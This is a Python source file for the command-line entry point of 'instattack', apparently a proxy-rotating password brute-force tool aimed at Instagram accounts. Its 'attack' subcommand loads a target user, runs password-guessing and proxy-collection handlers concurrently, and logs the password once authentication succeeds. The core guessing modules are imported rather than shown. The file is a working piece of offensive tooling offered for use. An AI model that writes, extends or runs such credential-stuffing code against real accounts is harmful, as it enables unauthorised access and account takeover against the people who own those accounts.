from argparse import ArgumentTypeError
import asyncio
from platform import python_version
from plumbum import cli
import tortoise

from instattack import logger
from instattack.conf import Configuration
from instattack.src.users import User

from .utils import post_handlers


class BaseApplication(cli.Application):
    """
    Used so that we can easily extend Instattack without having to worry about
    overriding the main method.
    """
    log = logger.get_sync('Application')
    _config = None

    @classmethod
    def run(cls, *args, **kwargs):
        # TODO: Validate just the structure of the configuration object
        # here, but not the path.
        cls._config = Configuration.load()
        return super(BaseApplication, cls).run(*args, **kwargs)

    @property
    def config(self):
        return self._config

    async def get_user(self, username):
        try:
            user = await User.get(username=username)
        except tortoise.exceptions.DoesNotExist:
            self.log.error(f'User {username} does not exist.')
            return None
        else:
            user.setup()
            return user

    async def check_if_user_exists(self, username):
        try:
            user = await User.get(username=username)
        except tortoise.exceptions.DoesNotExist:
            return None
        else:
            return user

    def post_handlers(self, user):
        return post_handlers(user, self.config)


class EntryPoint(BaseApplication):

    def main(self, *args):
        self.validate(*args)

    def validate(self, *args):
        if int(python_version()[0]) < 3:
            raise EnvironmentError('Please use Python 3')

        if args:
            raise ArgumentTypeError("Unknown command %r" % (args[0]))

        # The nested command will be`None if no sub-command follows
        if not self.nested_command:
            raise ArgumentTypeError("No command given")


@EntryPoint.subcommand('attack')
class BaseAttack(BaseApplication):

    __name__ = 'Run Attack'

    # Overrides Password Limit Set in Configuration File
    limit = cli.SwitchAttr("--limit", int, mandatory=False,
        help="Limit the number of proxies to collect.")

    collect = cli.Flag("--collect", default=False)

    def main(self, username):
        """
        Iteratively tries each password for the given user with the provided
        token until a successful response is achieved for each password or
        a successful authenticated response is achieved for any password.

        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        loop = asyncio.get_event_loop()
        if self.limit:
            self._config.update({'login': {'limit': self.limit}})

        # Default Collect to False
        self._config.update({'proxies': {'pool': {'collect': self.collect}}})

        user = loop.run_until_complete(self.get_user(username))
        if not user:
            return

        proxy_handler, password_handler = post_handlers(user, self.config)

        try:
            results = loop.run_until_complete(asyncio.gather(
                password_handler.run(loop),
                proxy_handler.run(loop)
            ))
        except Exception as e:
            loop.run_until_complete(proxy_handler.stop(loop))
            loop.call_exception_handler({'exception': e})
        else:
            loop.run_until_complete(proxy_handler.stop(loop))
            result = results[0]

            if result.authorized:
                self.log.success(f'Authenticated User!', extra={
                    'password': result.context.password
                })
